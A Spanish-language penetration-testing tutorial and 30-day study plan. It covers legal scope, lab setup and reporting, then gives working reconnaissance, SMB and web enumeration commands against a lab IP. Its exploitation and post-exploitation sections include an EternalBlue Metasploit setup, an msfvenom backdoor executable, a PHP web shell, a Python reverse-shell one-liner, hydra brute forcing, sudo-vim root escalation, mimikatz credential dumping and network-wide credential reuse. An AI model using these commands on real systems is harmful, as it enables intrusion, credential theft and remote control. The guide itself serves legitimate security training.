## Fundamentos
Antes de tocar herramientas, grabátelo en la piel:
- **Objetivo del pentester** → pensar como atacante, actuar con método, documentar todo.
- **Objetivo**: grabar en la piel que todo pentest legítimo requiere autorización escrita, límites claros (scope) y reglas de engagement.
- - **Qué aprender:** aspectos legales (leyes locales sobre acceso informático), ética profesional, contratos de pruebas, definición de scope, acuerdos de non-disclosure.
**Resultado esperado:** sabes justificar cualquier acción ante un juez o cliente; tus pruebas siempre son autorizadas.

## Fundamentos técnicos
**Objetivo**: dominar los conceptos en los que se apoya cualquier intrusión —sin los cuales eres un peligro para ti misma.
**Temas clave:**
**- Redes:** modelo OSI, TCP/IP, puertos, NAT, routing básico, DNS.
**- Sistemas operativos: **internals básicos de Linux y Windows (procesos, permisos, servicios, logs).
**- Servicios comunes:** HTTP(S), SSH, SMTP, SMB, LDAP, RDP — qué son y qué papel juegan en un entorno corporativo.
**- Programación: **Python (automatización), lectura de scripts, conceptos de HTTP requests/responses.
**- Criptografía básica: **certificados TLS, hashing, autenticación.
**- Cómo entrenar (seguro): **cursos intro en plataformas educativas y laboratorios controlados.

## Mapa técnico: qué aprender con profundidad (no comandos; sí objetivos y cómo interpretar)

### A) Redes & protocolos
Objetivo: entender TCP/IP, puertos, flags TCP, sesiones, NAT.
Qué interpretar: si ves muchos SYN rechazados → posible firewall/IPS; sesiones establecidas → servicio legítimo.

### B) Sistemas (Linux / Windows)
Objetivo: procesos, permisos, sistemas de logging, gestión de usuarios, servicios.
Qué interpretar: procesos con nombres sospechosos, cronjobs o tareas programadas inusuales, archivos con permisos 777.

### C) Servicios comunes (HTTP, SSH, SMB, RDP, SMTP, LDAP)
Objetivo: qué información revela cada banner y cómo se mapea a riesgos.
Qué interpretar: versiones desactualizadas indican necesidad de parche; servicios de administración expuestos indican alto riesgo.

### D) Web Apps (OWASP Top 10)
Objetivo: entender cada categoría (Broken Auth, Injection, XSS, CSRF, etc.) y qué buscar en respuestas y logs.
Qué interpretar: errores verbosos del servidor, redirecciones extrañas, cookies sin flags de seguridad.

### E) Active Directory / Kerberos (conceptual)
Objetivo: estructura de AD, trusts, GPOs, cómo se gestionan identidades.
Qué interpretar: cuentas con SPNs, cuentas con contraseñas sin expiración, delegaciones mal configuradas.

### F) Cloud security (conceptual)
Objetivo: responsabilidad compartida, políticas IAM, buckets/object storage.
Qué interpretar: políticas overly-permissive, credenciales embebidas en repositorios.

### G) Forense y detección
Objetivo: logs, SIEM, MITRE ATT&CK — mapear acciones a detecciones.
Qué interpretar: actividad anómala con proceso inusual, cambios de hora, conexiones salientes inesperadas.

## 30 días intensivos — plan de campo militarizado (día a día)

### Semana 1 — Fundamentos sólidos
D1: TCP/IP, modelo OSI, puertos comunes.
D2: Linux básico — usuarios, permisos, ps, netstat (conceptual).
D3: Windows internals — servicios, event logs.
D4: HTTP fundamentals — requests/responses, headers, cookies.
D5: Repaso + quiz técnico (auto-evaluación).
D6–7: Laboratorio OSINT: ejercicios en plataformas que permitan OSINT legal.

### Semana 2 — Surface mapping & web basics
D8: Web app architecture + OWASP Top 10 (estudio).
D9: Herramientas de análisis de tráfico y proxies (conceptual: qué mirar).
D10: Práctica en lab: identificar endpoints en Juice Shop/WebGoat (sin explotarlos).
D11: Análisis de logs — correlación de eventos.
D12: Introducción a CVEs y cómo buscar mitigaciones.
D13–14: Mini-proyecto: dossier OSINT + mapa de activos (entorno controlado).

### Semana 3 — Profundización (defensa y detección)
D15: MITRE ATT&CK mapping — cómo traducir técnicas a detecciones.
D16: SIEM basics y playbooks de respuesta.
D17: Simulación de incidente (roleplay): defender vs intruso (análisis de logs).
D18: Active Directory conceptual study.
D19: Cloud security concepts (IAM, storage, keys).
D20–21: Build a remediation plan for a hypothetical breach.

### Semana 4 — Portafolio & preparación laboral
D22: Crear un writeup profesional de una máquina legal de HTB/TryHackMe (estructura + lenguaje).
D23: Práctica de entrevistas técnicas: preguntas y respuestas modelo.
D24: Simulación de reporte ejecutivo para CISO.
D25: Revisión del CV, GitHub y LinkedIn (qué poner y cómo).
D26: Certificaciones: elegir ruta (OSCP, eJPT, etc.) y preparación.
D27–30: Mock-assessment completo: desde OSINT hasta reporte — tú decides y yo te doy la evaluación.

## Principios
- Disciplina: todo queda documentado. Anotar cada paso como si mañana tuvieras que presentarlo en un juicio militar.
- Método: cada hallazgo va a hipótesis + evidencia + recomendación.
- Prioridad: late, high, medium, low — y justifica con impacto (pérdida confidencialidad, integridad, disponibilidad).
- Criterio de no daño: pruebas que destruyan datos no son aceptables en la mayoría de clientes.
- Telemetry-aware: cada prueba debe pensar en qué vería el defensor (logs, IDS, EDR).
- Controlar la adrenalina: el pentesting es paciencia, no fuegos artificiales.
- Aprender en laboratorios controlados: HackTheBox, TryHackMe, VulnHub.

## Idea central:
- Primero observas (pasivo).
- Luego mapeas (activo).
- Después recolectas información interna (enumeración).
- Detectas vulnerabilidades (escaneo).
- Explotas esas vulnerabilidades (acceso inicial).
- Subes de nivel dentro del sistema (control total).

## Checklist: laboratorio seguro
- Configura un entorno aislado y responsable.
- Usa un host físico o portátil con suficiente RAM y CPU. Virtualiza con VirtualBox/VMware/Proxmox.
- Crea una red aislada (host-only) para las VMs del laboratorio; nada de NAT hacia Internet salvo para actualizaciones controladas.
- Instala: una VM con Kali/Parrot (tu herramienta) y varias VMs vulnerables propias (Metasploitable, Juice Shop, WebGoat, DVWA o máquinas de CTF que hayas descargado legalmente).
- Snapshots: crea snapshots antes de cada ejercicio (rollback obligatorio).
- Habilita captura de tráfico (Wireshark/tcpdump) en la red del laboratorio para poder analizar.
- Lleva un registro de cadena de custodia: qué haces, cuándo y por qué.
- Si practicas en plataformas en la nube o labs de terceros, respeta TOS y scope del laboratorio.
- Asegura que no vas a atacar recursos que no te pertenecen o no están explícitamente autorizados.

## Plantilla informe
Portada: cliente, alcance, fechas, versión del informe.
Resumen ejecutivo (1 página): impacto general, riesgo crítico a tomar ya, acciones inmediatas. — Ejemplo: “Se identificó exposición de servicio X con riesgo de acceso no autorizado. Recomendación: aislar servicio y aplicar parche X.”
Metodología: fases realizadas, herramientas (lista genérica), entorno de pruebas.
Hallazgos (tabla): ID | Título | Severidad | Evidencia (p.ej. “registro del servidor, captura de respuesta”) | Impacto | Recomendación.
Evidencia técnica: logs, capturas de pantalla, snippets de respuesta (sin payloads que exploten).
Plan de remediación priorizado: pasos concretos a nivel de configuración o política.
Appendix: lista de recursos, referencias y cómo reproducir pruebas en entorno controlado.

## **Fases (conceptual):**
- Planificación — reglas, alcance, objetivos.
- Reconocimiento (OSINT) — recolección pasiva de información pública.
  Objetivo: distinguir información valiosa de ruido y convertir hallazgos en hipótesis de ataque/defensa.
  Qué se estudia (conceptos): WHOIS, registros DNS, certificados TLS y su metadata, perfiles públicos de empleados, subdominios, historial de filtraciones, huellas en Shodan/Netcraft, fuentes públicas (GitHub, LinkedIn).
  Producto de la fase: inventario de activos, lista de correos clave, posibles rutas de acceso.
  Dónde practicar legalmente: salas y retos orientados a OSINT en plataformas de formación
  
- Enumeración / Scanning — identificación de activos y servicios expuestos (concepto: huella vs ruido).
  Objetivo: aprender a interpretar lo que un servicio expuesto te dice (versión, configuración, comportamiento), sin “apretar el gatillo”.
  Conceptos: diferencia entre detección pasiva y activa; cómo medir riesgo de un servicio expuesto; qué información es prioritaria (servicios de gestión, RDP/SMB/LDAP, API públicas).
  Resultado: un mapa de riesgo por activo (priorizado por impacto y probabilidad).

- Análisis de vulnerabilidades — priorizar vectores con impacto real.
  Objetivo: conocer las familias de fallos más frecuentes y por qué ocurren.
  Web apps: OWASP Top 10 — entender cada categoría (Broken Access Control, Injection, XXS, etc.) y qué señales buscar en logs o tráfico. 
  Infraestructura: configuraciones inseguras, servicios sin parchear, exposición de backups, credenciales mal gestionadas.
  Resultado didáctico: para cada familia de vulnerabilidad sabrás cómo detectarla de forma segura y qué mitigación exigir.
  
- Explotación (conceptual) — ganar acceso controlado en entorno autorizado.
  Objetivo: entender qué significa “explotar” un fallo, cuáles son las consecuencias técnicas y legales, y cómo documentar cualquier prueba de concepto sin causar daño.
  Práctica segura: labs que simulan vulnerabilidades donde tú aplicas lo aprendido en entornos cerrados (TryHackMe, HTB Academy).

- Post-explotación (conceptual) — contención, movimiento lateral en un scope autorizado, recuperación de evidencia.
  Objetivo: comprender lo que hace un intruso en una red y cómo un defender lo detecta (logs, EDR, comportamiento anómalo).
  Herramientas conceptuales: mapeo de técnicas a detecciones usando MITRE ATT&CK; interpretar telemetría para construir indicadores de compromiso. 
  Producto: plan de mitigación y playbooks de respuesta para cada técnica relevante.

- Reporte y remediación — informe ejecutivo y técnico, recomendaciones de mitigación.
  Objetivo: dominar el informe que decide acciones de parcheo.
  Estructura del informe: resumen ejecutivo (impacto y riesgo), evidencia técnica (pruebas, screenshots, logs — respetando leyes), pasos para reproducir en entorno seguro, prioridad y recomendaciones.
  Estándares: usar métricas como CVSS para priorizar (concepto, no cálculo detallado).
  Resultado: tu informe convence al CTO y al CISO a tomar acción inmediata.
  
- Marco estándar y guía: utiliza documentos como NIST SP-800-115 para formalizar procesos de pruebas
  
- Temas avanzados (visión estratégica)
  Active Directory y entornos Windows enterprise (conceptos de confianza, Kerberos, GPOs).
  Cloud: responsabilidad compartida, malconfiguraciones comunes en AWS/Azure/GCP (qué revisar conceptualmente).
  IoT y OT: particularidades y riesgos.
  Red-team vs Purple-team: diferencias y objetivos.

## Modelo de fases (Metodología OSSTMM/OWASP):
- Reconocimiento (inteligencia previa)
- Escaneo/Enumeración (descubrir superficie de ataque)
- Explotación (ganar acceso)
- Post-explotación (mantener, elevar privilegios, moverse, robar información)
- Reporte (el arma escrita: documentar hallazgos)

## Arsenal básico
Empieza con Kali Linux o Parrot OS (distros diseñadas para pentesting).

## Herramientas principales:
- Reconocimiento: whois, dig, nslookup, theHarvester, Maltego.
- Escaneo: nmap, masscan, nikto.
- Explotación: metasploit, sqlmap, hydra.
- Post-explotación: mimikatz, bloodhound, netcat.

## Comandos iniciales:

### Escaneo rápido de puertos con Nmap
nmap -p- --open -T4 -v <IP>

### Escaneo detallado con detección de servicios
nmap -sV -sC <IP>

v# Whois para información de dominio
whois <dominio>

### Recolección de emails y subdominios
theHarvester -d <dominio> -b google

## Procedimiento de ataque

Lección táctica
- Nunca saltas directo a explotar. Primero trazas un mapa completo.
- El reconocimiento es el 70% del éxito. Si entras a ciegas, mueres.
- Piensa militarmente: cada puerto abierto es una puerta sin guardia; cada email encontrado, un soldado al que puedes manipular.


## Reconocimiento pasivo (sin tocar al objetivo):
OSINT. Aquí actúas como espía antes de cruzar la frontera. No hay huella, no hay contacto directo con el objetivo. Solo recogida.
- Buscar info en Google, LinkedIn, Shodan.
- Mapear la organización (emails, subdominios, empleados).

### Whois – identificar al propietario del dominio.
whois acme-corp.com

→ Datos: dirección física, correo admin, registrador, fechas.
Valor: nos da posibles vectores (emails, estructura de la empresa).

###  DNS Recon – mapeo de subdominios.
dig acme-corp.com any
dig ns acme-corp.com
→ Descubres servidores de correo, web, DNS.

###  theHarvester – emails y subdominios en fuentes públicas.
theHarvester -d acme-corp.com -b google
→ Extraes emails corporativos → posibles credenciales filtradas.

###  Shodan.io – inteligencia técnica.
Pones hostname:"acme-corp.com"
Miras qué IPs, servicios y versiones están expuestos.
Valor militar: aquí localizas máquinas vulnerables sin siquiera tocarlas.

### Mentalidad: estás llenando tu libreta de guerra con nombres, IPs, correos, posibles rutas de ataque. No has disparado aún.

## Reconocimiento activo (tocando al objetivo):
Ahora cruzas la línea. Estás tocando al objetivo. Aquí pueden detectarte, así que piensas como un francotirador: preciso, frío.
- Escaneo de puertos con nmap.
- Descubrir versiones de servicios (-sV).
- Buscar directorios con gobuster o dirb.

### Escaneo rápido de superficie

#### Nmap (Network Mapper).
Función: radar que te dice qué puertas del castillo están abiertas.

nmap -p- --open -T4 -v 10.10.10.5
→ Devuelve qué puertos están abiertos (ejemplo: 22/SSH, 80/HTTP, 443/HTTPS).

**Explicación:
**-p- → escanea todos los puertos (1-65535).
--open → muestra solo los abiertos.
-T4 → rapidez agresiva (útil en lab, peligroso en producción porque te pueden detectar).
-v → verbose (más info en pantalla).

#### Enumeración/escaneo de servicios y versiones
nmap -sV -sC -p22,80,139,445 10.10.10.5

**Explicación:**
-sV → detecta versiones del software.
-sC → lanza scripts NSE por defecto (pruebas comunes).
-p22,80,139,445 → limitamos a los puertos encontrados antes.

#### SMB — Enumerar servicios en 139/445 (Samba / Windows shares)
Herramientas: enum4linux, smbclient, smbmap.

Mapa rápido con Nmap + NSE (scripts)
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery -Pn -v 10.10.10.5

- Qué hace: pide a nmap que use scripts NSE orientados a SMB: lista shares, usuarios y info OS.
- Por qué: te da una visión inicial automatizada: shares expuestos, cuentas visibles, banner de Samba.
- Qué mirar: nombre de shares, si aparecen ADMIN$, C$, backup, permisos reportados, versión de Samba (ej. 3.6.23).
- Interpretación: shares públicos o con permisos READ/WRITE te indican vectores para buscar ficheros sensibles en el lab; versiones antiguas ≈ buscar CVEs conceptualmente (no explotar).

#### Detalle con enum4linux

enum4linux -a 10.10.10.5

Qué hace: agrupa varias consultas SMB/RPC: usuarios, shares, política de contraseñas, grupos, sesiones.
Por qué: te da un dump legible de la «estructura de cuentas» y shares accesibles.
Qué mirar: lista de usuarios (john.smith, guest), shares, si la máquina pertenece a dominio, políticas (password not required), objetos con permisos extraños.

#### Directorios ocultos (fuerza bruta)
gobuster dir -u http://acme-corp.com -w /usr/share/wordlists/dirb/common.txt

#### Listar shares con smbclient (prueba de null session / guest)
smbclient -L //10.10.10.5 -N

- -L lista shares, -N intenta sin password (null session).
- Qué mirar: si la lista muestra shares y si alguno indica READ o WRITE accesible a guest.
- Si hay un share público: conéctate para navegar (LAB ONLY):
smbclient //10.10.10.5/backup -N
en el prompt de smbclient:
ls
get config.txt
exit

- Qué hace: te permite listar y descargar ficheros del share si tienes permiso.
- Qué buscar en archivos: ficheros de configuración, .env, .sql, backup.zip, con credenciales o rutas.
- Advertencia: cualquier descarga solo en tu laboratorio. Documenta cada fichero con timestamp y checksum (sha256).

#### Permisos y acceso con smbmap
smbmap -H 10.10.10.5

- Qué hace: muestra shares y permisos (READ/WRITE/NO ACCESS) de forma clara.
- Por qué: priorizas objetivos: share con WRITE es alto valor para un atacante y para ti, para entender riesgo.

####  RPC y enumerate users (si el servidor permite)
# Si null session permitido:
rpcclient -N 10.10.10.5 -c 'enumdomusers'
# Si necesitas user: 
rpcclient -U 'username%password' 10.10.10.5 -c 'enumdomusers'

- Qué hace: consulta RPC para listar usuarios del dominio/host.
- Por qué: confirmar existencia de cuentas y RIDs que podrás documentar y correlacionar con OSINT.
- Qué mirar: cuentas con RID bajos (builtins), cuentas con contraseñas no expiran, cuentas de servicio.
- Si ves share backup con READ: posibilidad de encontrar backups con credenciales, configs, PII — alto riesgo.
- Si ves WRITE: posibilidad de upload (en un lab: prueba con archivo inocuo). En producción: riesgo crítico.
- Documenta: comando exacto, output completo (archivo), captura de pantalla, sha256 de cada fichero descargado y hora (UTC).

#### Enumerar HTTP (puerto 80). Herramienta: gobuster para buscar directorios ocultos.

#### Cabeceras HTTP / fingerprint rápido
curl -I http://10.10.10.5

- Qué hace: pide solo cabeceras (HEAD).
- Qué mirar: Server: Apache/2.4.18 (Ubuntu) → version, X-Powered-By: PHP/7.0.15 → tecnología, cookies sin flags, etc.
- Interpretación: versión + framework → te dice qué familias de bugs mirar en el lab y qué información aportar en el informe.

#### Fingerprinting con WhatWeb
whatweb http://10.10.10.5

- Qué hace: intenta identificar CMS, frameworks, tecnologías.
- Por qué: saber si es WordPress, Joomla, una API Node, etc. → guía enfásis de pruebas (en lab).

#### Búsqueda de directorios (fuerza de discovery controlada) — Gobuster
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -o gobuster_out.txt

- -w = wordlist; -x extensiones; -t threads; -o output.
- Qué mirar en la salida: rutas con status 200 (accesible), 301 (redirige), 403 (protegido) — todas valiosas.
- Interpretación: /admin 200 → página de login visible; /backup 200 → posible endpoint con ficheros.

#### Robots & sitemap (inteligencia pasiva)
curl -s http://10.10.10.5/robots.txt
curl -s http://10.10.10.5/sitemap.xml

- Por qué: muchas veces se listan rutas sensibles en robots.txt (en labs y en la vida real).

#### Enumeración con Nmap scripts web
nmap -p 80 --script http-enum,http-title,http-headers -oN nmap_http_enum.txt 10.10.10.5

- Qué hace: scripts NSE específicos para web: lista páginas comunes, titulares, headers.
- Por qué: complementar gobuster con otra fuente automatizada.

#### Analizar respuestas y parámetros (Burp Suite — GUI)
- Configura tu navegador con proxy 127.0.0.1:8080 y usa Burp Intercept/Repeater para capturar peticiones.
- Qué mirar: parámetros en URLs, formularios, cookies sin Secure/HttpOnly, cabeceras CORS permisivas.
- No ejecutar exploits; en lab, prueba entradas controladas para ver comportamiento y registrar respuestas.

### Captura de evidencia (obligatoria en cada fase)

Captura de tráfico (PCAP)
sudo tcpdump -i any host 10.10.10.5 and \(port 80 or port 139 or port 445\) -w fase4_capture.pcap

- Por qué: guardar todo el tráfico relevante para revisar en Wireshark y apoyar el informe.
- Qué archivar: pcap, salidas nmap, output de enum4linux, gobuster_out.txt, archivos descargados (con checksums).
- Hash de evidencias
sha256sum fase4_capture.pcap > fase4_capture.pcap.sha256
sha256sum archivo_descargado.zip > archivo_descargado.zip.sha256

- Por qué: cadena de custodia, integridad de la evidencia.
- Timestamps y notas
- Registra: UTC timestamp, comando exacto (copiar/pegar), máquina desde la que se ejecutó, red (host-only), snapshot usado.

### Resumen rápido de flujo a ejecutar en tu lab (lista corta)
```
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery -Pn -v 10.10.10.5
enum4linux -a 10.10.10.5
smbclient -L //10.10.10.5 -N → si hay share público: smbclient //10.10.10.5/backup -N → ls, get <file>
smbmap -H 10.10.10.5
curl -I http://10.10.10.5 + whatweb http://10.10.10.5
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -o gobuster_out.txt
nmap -p 80 --script http-enum,http-title -oN nmap_http_enum.txt 10.10.10.5
sudo tcpdump -i any host 10.10.10.5 and \(port 80 or port 139 or port 445\) -w fase4_capture.pcap
Hash + archiva todo, prepara entrada de informe.
```

## Escaneo de Vulnerabilidades
Identificar servicios expuestos y versiones vulnerables en los sistemas descubiertos en la fase de reconocimiento. Aquí ya no solo sabes que existe un puerto abierto: ahora te interesa saber si el servicio tiene agujeros, versiones obsoletas, configuraciones débiles o vulnerabilidades públicas asociadas (CVEs).
Herramientas:
- Nmap (scripts NSE) → el clásico, pero con scripts que detectan vulnerabilidades conocidas.
- OpenVAS / Greenbone → un escáner de vulnerabilidades completo.
- Nessus (en entornos profesionales) → muy usado en auditorías.
- Nikto → escáner de servidores web.
- wpscan → especializado en WordPress.
- Searchsploit → para buscar exploits relacionados con los servicios detectados.

#### Confirmar el host
Antes de lanzarte, confirmas que el host sigue activo:
ping -c 4 10.10.10.5

#### Escaneo de versión con Nmap
Si ya sabemos qué puertos están abiertos (ejemplo: 22/SSH, 80/HTTP, 445/SMB), ahora investigamos qué versión exacta de software corre:
nmap -sV -p 22,80,445 10.10.10.5

#### Escaneo con scripts NSE
Nmap tiene scripts específicos para detectar vulnerabilidades:
nmap --script vuln -p 22,80,445 10.10.10.5

- Te devuelve exploits relacionados con esa versión.

#### Escaneo de vulnerabilidades con Nikto (para web)
nikto -h http://10.10.10.5

- Detecta directorios ocultos, configuraciones inseguras, software vulnerable.

#### Buscar exploits disponibles
Con Searchsploit:
searchsploit Apache 2.4.29

#### Correlacionar con bases de datos de CVEs
Miras qué CVEs críticos aparecen y priorizas.

## Explotación
Ahora cruzas la línea. Estás tocando al objetivo. Aquí pueden detectarte, así que piensas como un francotirador: preciso, frío.

**Objetivo**
- Usar las vulnerabilidades encontradas en la fase 4 para ganar acceso inicial (shell, credenciales, ejecución de comandos remotos).
- Validar que la vulnerabilidad es explotable en la práctica.
- Preparar el terreno para la escalada de privilegios.
- Escaneo básico de puertos (mapa rápido)

**Herramientas principales**
- Metasploit Framework → framework de exploits automatizados.
- ExploitDB + Searchsploit → base de datos de exploits públicos.
- MSFvenom → creación de payloads (reverse shells, bind shells, trojans).
- Python / Bash one-liners → shells rápidas.
- Impacket (para SMB, RDP, etc).
- Hydra / Medusa → fuerza bruta de credenciales.

**Comandos:**
SQLi → sqlmap -u "http://target.com/page.php?id=1" --dbs
Fuerza bruta → hydra -l admin -P passwords.txt ssh://<IP>
Framework → msfconsole en Metasploit.

#### Confirmar vulnerabilidad
Ejemplo: detectaste SMBv1 vulnerable (MS17-010).
Comando de confirmación (con nmap):

nmap --script smb-vuln-ms17-010 -p445 10.10.10.5

Si devuelve "VULNERABLE", la presa está lista.

#### Buscar exploit adecuado

Con Searchsploit:

searchsploit ms17-010

Encuentras varios exploits, por ejemplo windows/smb/ms17_010_eternalblue.

#### Metasploit

Abrir el framework:

msfconsole

Buscar el exploit:

search ms17_010

Seleccionar:

use exploit/windows/smb/ms17_010_eternalblue

Configurar parámetros:

set RHOSTS 10.10.10.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3   # tu IP atacante
set LPORT 4444

Ejecutar:

exploit

#### Payloads manuales con MSFvenom

Ejemplo de crear un ejecutable malicioso:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > backdoor.exe

Este .exe puede ser colocado en el objetivo (mediante ingeniería social o subida a un servidor web vulnerable).

#### Shells ligeras (sin Metasploit)

Ejemplo: servicio web con RCE → mandar payload en PHP:

<?php system($_GET['cmd']); ?>

Después accedes:

http://10.10.10.5/shell.php?cmd=whoami

Ejemplo en Python (reverse shell):

python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

#### Fuerza bruta si no hay exploit directo

Si encuentras SSH abierto (22):

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

Intenta credenciales hasta dar con una válida.

#### Validar acceso conseguido

Dentro del sistema, siempre confirmar:

whoami
hostname
ipconfig / ifconfig

Esto prueba que realmente tienes control sobre la máquina.

## Post-explotación:

- Moverte en red interna.
- Elevar privilegios con exploits locales.
- Dump de credenciales con mimikatz.


**Objetivo**
- Convertir tu acceso inicial (usuario limitado) en root/admin.
- Identificar vectores de escalada: vulnerabilidades locales, configuraciones débiles, credenciales almacenadas, permisos mal configurados.
- Documentar cada hallazgo con evidencia, tal como se hace en auditoría profesional.

Herramientas
- LinPEAS / WinPEAS → scripts de enumeración de privilegios en Linux y Windows.
- GTFOBins → para identificar binarios explotables con permisos elevados.
- sudo / su exploits → en Linux si hay privilegios mal configurados.
- Mimikatz → extracción de credenciales en Windows.
- CrackMapExec / Impacket → para reusar credenciales en la red.
- Exploits locales conocidos → searchsploit para versiones específicas.

### LINUX

#### Enumeración inicial del sistema

whoami
id
uname -a
cat /etc/os-release

Qué mirar:
- Usuario actual, grupos, privilegios (sudo permitido o no).
- Kernel y versión del OS → posibles exploits locales.

#### Escaneo automatizado con LinPEAS

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

- Qué hace: lista vulnerabilidades, permisos inseguros, programas setuid, servicios vulnerables, contraseñas en ficheros.
- Qué buscar:
Archivos con contraseñas.
Binarios setuid con exploits conocidos.
Servicios mal configurados.

#### Buscar binarios con privilegios

find / -perm -4000 -type f 2>/dev/null

- Qué hace: lista archivos setuid (programas que corren con permisos de root).
- Por qué: si alguno es explotable (GTFOBins), puedes elevar privilegios.

#### Revisar sudoers

sudo -l

- Qué hace: muestra si tu usuario puede ejecutar comandos con sudo sin contraseña.
- Interpretación: si aparece un binario permitido → vector de escalada.

Ejemplo:
User zyanetralys may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/vim
    
Esto significa que puedes abrir Vim con root y ejecutar shell:

sudo vim -c ':!bash'

Resultado: shell root inmediata.

#### Credenciales locales y ficheros

Buscar passwords guardadas:

grep -i password /home/*/.* 2>/dev/null

Revisar /etc/shadow si se tiene acceso.

### WINDOWS

#### Enumeración inicial con WinPEAS

winpeas.exe

Qué busca: privilegios de administrador, configuraciones inseguras, contraseñas en registros o archivos de configuración, servicios vulnerables.

#### Explotación de credenciales

Si el usuario tiene privilegios para ver contraseñas:

mimikatz

Dentro de mimikatz:
privilege::debug
sekurlsa::logonpasswords

- Resultado esperado: dump de hashes y contraseñas en memoria.

#### Reutilización de credenciales
Con Impacket / CrackMapExec:

crackmapexec smb 10.10.10.5 -u Administrator -p 'Password123!'

- Qué hace: testea acceso a la máquina/otros hosts usando credenciales encontradas.

#### Escalada mediante servicios vulnerables
- Revisar servicios que corren como SYSTEM.
- Exploits locales conocidos para esa versión de Windows → searchsploit Windows 7 x64 local exploit.

### Linux
#### Enumeración de permisos
sudo -l
find / -perm -4000 -type f 2>/dev/null
./linpeas.sh

#### Exploit de binario permitido con sudo
sudo vim -c ':!bash'
whoami

### Windows
#### Enumeración de privilegios y vulnerabilidades
winpeas.exe

##### Dump de credenciales
mimikatz
privilege::debug
sekurlsa::logonpasswords

##### Conectar a otros hosts usando credenciales
crackmapexec smb 10.10.10.0/24 -u Administrator -p 'Password123!'

## ✅ Checklist de entrenamiento militar
 Reconocimiento pasivo completo.
 Reconocimiento activo y mapeo de servicios.
 Enumeración profunda de SMB y web.
 Escaneo de vulnerabilidades confirmado.
 Explotación con Metasploit / manual.
 Escalada de privilegios Linux y Windows.
 Documentación de resultados y logs simulados.
